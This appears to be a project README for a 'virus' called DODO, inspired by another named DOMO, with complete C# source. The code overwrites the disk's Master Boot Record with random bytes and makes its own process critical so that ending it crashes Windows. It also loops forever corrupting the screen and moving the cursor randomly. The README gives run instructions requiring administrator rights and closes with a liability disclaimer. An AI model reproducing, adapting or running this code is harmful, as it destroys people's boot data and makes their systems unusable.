# DODO~VIRUS

![Virus Preview](https://i.ibb.co/QkBqtSC/D51-B5-ECC-D63-E-43-C1-925-A-1-D380-E380584.png)

This project contains C# code that implements various bizarre effects on the system, inspired by a virus called **DOMO**, created by an individual named **ABOLHB**. The `MasonClass` code is designed to demonstrate specific functionalities that include manipulating system resources in a way that simulates various disruptive behaviors. The key features of this code include:

## Code Description

### Key Functionalities

1. **Writing to the MBR**:
   - The code includes a method that modifies the Master Boot Record (MBR) of the primary hard drive. Writing to the MBR can disrupt the boot process of a system, which can lead to data loss or inaccessibility.
   - The function generates random bytes and writes them to the MBR, essentially overwriting critical boot information. This is done through direct file access to the physical drive.

2. **Creating Screen Effects**:
   - The code employs GDI (Graphics Device Interface) functions to create visual disturbances on the screen. It achieves this by continuously drawing random areas of the screen with varying opacities, creating a flickering effect that can be quite disorienting.
   - A dedicated thread is started to handle these visual effects, allowing the main application to run concurrently without freezing the user interface.

3. **Random Mouse Movement**:
   - The code simulates mouse movement by changing the cursor's position to random coordinates on the screen. This is accomplished by invoking Windows API calls that manipulate the cursor's location.
   - Another thread manages this functionality, causing the mouse to move unpredictably, which can be frustrating for users attempting to interact with their system.

### Usage Instructions

- This code should be run on a Windows system with administrative privileges due to the nature of the operations performed, particularly writing to the MBR.
- Ensure that you have appropriate permissions and are aware of the risks involved in modifying system-level components.

![Doomoo Image](https://i.ibb.co/4156j7R/doomoo.png)

### Code Implementation

Here’s the complete implementation of the MasonClass:

```csharp
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.IO;

class MasonClass
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("gdi32.dll", CharSet = CharSet.Auto)]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")]
    static extern void SetCursorPos(int X, int Y);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const int SM_CXSCREEN = 0;
    const int SM_CYSCREEN = 1;
    const uint NOTSRCERASE = 0x001100A6;
    const uint GENERIC_WRITE = 0x40000000;
    const uint OPEN_EXISTING = 3;

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
    private const int ProcessInformationClass = 29;

    static void Main()
    {
        MasonWriteMBR(); // Call to write to MBR
        Process currentProcess = Process.GetCurrentProcess();
        IntPtr handle = currentProcess.Handle;
        int isCritical = 1; 
        NtSetInformationProcess(handle, ProcessInformationClass, ref isCritical, sizeof(int));
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        MasonStartEffect(screenWidth, screenHeight); // Start visual effects
        MasonMoveMouseRandomly(screenWidth, screenHeight); // Start mouse movement
        while (true) // Keep the application running
        {
            Thread.Sleep(1000);
        }
    }

    static void MasonWriteMBR()
    {
        using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
        {
            byte[] mbrData = new byte[512]; // Buffer for MBR data
            Random rand = new Random();
            rand.NextBytes(mbrData); // Fill buffer with random bytes
            fs.Write(mbrData, 0, mbrData.Length); // Write to MBR
        }
    }

    static void MasonStartEffect(int screenWidth, int screenHeight)
    {
        Random rand = new Random();
        new Thread(() =>
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                BitBlt(hdc, rand.Next(15), rand.Next(15), screenWidth, screenHeight, hdc, rand.Next(15), rand.Next(15), NOTSRCERASE);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }).Start();
    }

    static void MasonMoveMouseRandomly(int screenWidth, int screenHeight)
    {
        Random rand = new Random();
        new Thread(() =>
        {
            while (true)
            {
                int x = rand.Next(0, screenWidth);
                int y = rand.Next(0, screenHeight);
                SetCursorPos(x, y); // Move mouse to random position
                Thread.Sleep(300); // Pause before next movement
            }
        }).Start();
    }
}
```
---
We hereby declare that we disclaim any liability for any improper use of the software Thank you for your understanding
